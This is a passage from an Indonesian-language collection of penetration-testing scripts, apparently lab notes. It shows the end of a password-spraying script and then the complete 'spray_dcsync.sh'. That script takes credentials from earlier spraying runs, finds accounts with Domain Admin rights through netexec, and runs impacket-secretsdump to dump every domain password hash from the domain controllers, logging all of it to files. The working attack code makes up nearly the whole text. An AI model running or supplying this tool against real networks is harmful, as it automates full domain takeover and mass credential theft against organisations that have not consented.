    rm -f "$OUTDIR/temp_clean.log"

else
    echo -e "${RED}[!] File mentah $RAW_OUT tidak ditemukan!${NC}"
fi

echo -e "\n${GREEN}[+] ALL PROCESSES FINISHED.${NC}"
```

### Usage
```bash
spray_auth (default baca file "target" yang berisi list IP)
spray_auth target user pass
```


## 10. spray_dcsync.sh

**Deskripsi:** Auto perform dcsync using secrets. Note: jalankan spray_noauth dan spray_auth terlebih dahulu.

### Setup
```bash
sudo nano /usr/local/bin/spray_dcsync
sudo chmod +x /usr/local/bin/spray_dcsync
```

### Script
```bash
#!/bin/bash

# ================================
# DEFAULT CONFIG
# ================================
DEFAULT_DOMAIN="corp.com"
DEFAULT_OUTDIR="./spray_netexec"
OUTPUT_DIR="$DEFAULT_OUTDIR"

# ================================
# ARG PARSING (optional output dir)
# ================================
if [[ "$1" == "--outdir" ]]; then
    OUTPUT_DIR="$2"
    shift 2
fi

mkdir -p "$OUTPUT_DIR"

FINAL_OUTPUT="$OUTPUT_DIR/final_dcsync.txt"
CREDS_FILE="$OUTPUT_DIR/creds_final.txt"
HIGH_PRIV_FILE="$OUTPUT_DIR/high_priv_creds.txt"

# ================================
# AUTO PATH DETECTION
# ================================
BASE_DIR="$(pwd)"

if [[ -d "$BASE_DIR/spray_netexec" ]]; then
    DATA_DIR="$BASE_DIR/spray_netexec"
else
    DATA_DIR="$BASE_DIR"
fi

AUTH_FILE="$DATA_DIR/final_auth_success.txt"
DC_FILE="$DATA_DIR/dc_candidates.txt"

# ================================
# MODE DETECTION
# ================================
if [[ $# -eq 0 ]]; then
    MODE="AUTO"
    DOMAIN="$DEFAULT_DOMAIN"
elif [[ $# -eq 4 ]]; then
    MODE="MANUAL"
    DOMAIN="$1"
    USER="$2"
    PASS="$3"
    TARGET_DC="$4"
else
    echo "Usage:"
    echo "  AUTO   : $0 [--outdir DIR]"
    echo "  MANUAL : $0 [--outdir DIR] <DOMAIN> <USER> <PASS> <DC_IP>"
    exit 1
fi

echo "========================================"
echo "[*] Mode        : $MODE"
echo "[*] Domain      : $DOMAIN"
echo "[*] Output Dir  : $OUTPUT_DIR"
echo "========================================"
echo ""

# reset output
> "$FINAL_OUTPUT"
> "$HIGH_PRIV_FILE"

# ================================
# FUNCTION
# ================================
run_check_and_dcsync() {
    local dc="$1"
    local user="$2"
    local pass="$3"

    echo "----------------------------------------"
    echo "[*] [$dc] Checking privilege: $user"

    # detect hash atau password
    if echo "$pass" | grep -Eq "^[0-9a-fA-F]{32}$"; then
        cmd="nxc smb $dc -u $user -H $pass -x 'whoami /groups'"
    else
        cmd="nxc smb $dc -u $user -p '$pass' -x 'whoami /groups'"
    fi

    echo "[CMD] $cmd"
    output=$(eval $cmd 2>/dev/null)

    echo "[OUTPUT]"
    echo "$output"
    echo ""

    # parsing groups
    groups=$(echo "$output" | grep -E "Group Name" -A 50 | tail -n +3 | awk '{print $1}' | tr '\n' ',' | sed 's/,$//')

    # detect privilege
    if echo "$output" | grep -Eqi "Domain Admins|Enterprise Admins|BUILTIN\\Administrators"; then
        priv="HIGH PRIV"
        echo "[+] HIGH PRIV FOUND: $user"
        echo "$dc|$user:$pass" >> "$HIGH_PRIV_FILE"
    else
        priv="LOW PRIV"
        echo "[-] Low priv: $user"
    fi

    {
        echo "========================================"
        echo "[USER] $user"
        echo "[DC] $dc"
        echo "[GROUPS] $groups"
        echo "[PRIV] $priv"
    } >> "$FINAL_OUTPUT"

    # DCSync kalau high priv
    if [[ "$priv" == "HIGH PRIV" ]]; then
        echo "----------------------------------------"
        echo "[*] Running DCSync with $user"

        cmd2="impacket-secretsdump -just-dc $DOMAIN/$user:'$pass'@$dc"
        echo "[CMD] $cmd2"

        output2=$(eval $cmd2)

        echo "[OUTPUT]"
        echo "$output2"
        echo ""

        {
            echo "[DCSYNC RESULT]"
            echo "$output2"
            echo ""
        } >> "$FINAL_OUTPUT"
    fi
}

# ================================
# AUTO MODE
# ================================
if [[ "$MODE" == "AUTO" ]]; then

    if [[ ! -f "$AUTH_FILE" ]]; then
        echo "[!] Missing: $AUTH_FILE"
        exit 1
    fi

    if [[ ! -f "$DC_FILE" ]]; then
        echo "[!] Missing: $DC_FILE"
        exit 1
    fi

    echo "[*] STEP 1: Parsing creds (LDAP + SMB)"


    raw=$(grep -E "^(LDAP|SMB)" "$AUTH_FILE" | grep '\[\+\]')

    echo "[OUTPUT RAW]"
    echo "$raw"
    echo ""

    echo "$raw" \
    | sed -E 's/.*\\\\([^:]+):([^ ]+).*/\1:\2/' \
    | awk '!seen[$0]++' > "$CREDS_FILE"

    echo "[+] Parsed creds:"
    cat "$CREDS_FILE"
    echo ""

    echo "[*] STEP 2: DC Targets"
    cat "$DC_FILE"
    echo ""

    while read -r dc; do
        [[ -z "$dc" ]] && continue

        echo "========================================"
        echo "[*] Target DC: $dc"
        echo "========================================"

        while IFS=: read -r user pass; do
            run_check_and_dcsync "$dc" "$user" "$pass"
        done < "$CREDS_FILE"

    done < "$DC_FILE"

fi

# ================================
# MANUAL MODE
# ================================
if [[ "$MODE" == "MANUAL" ]]; then
    run_check_and_dcsync "$TARGET_DC" "$USER" "$PASS"
fi

echo ""
echo "========================================"
echo "[*] DONE"
echo "========================================"
echo "[*] Output saved to: $FINAL_OUTPUT"
```

### Usage
```bash
spray_dcsync --outdir results/
spray_dcsync corp.com jeffadmin 'Password123!' 192.168.190.70

```
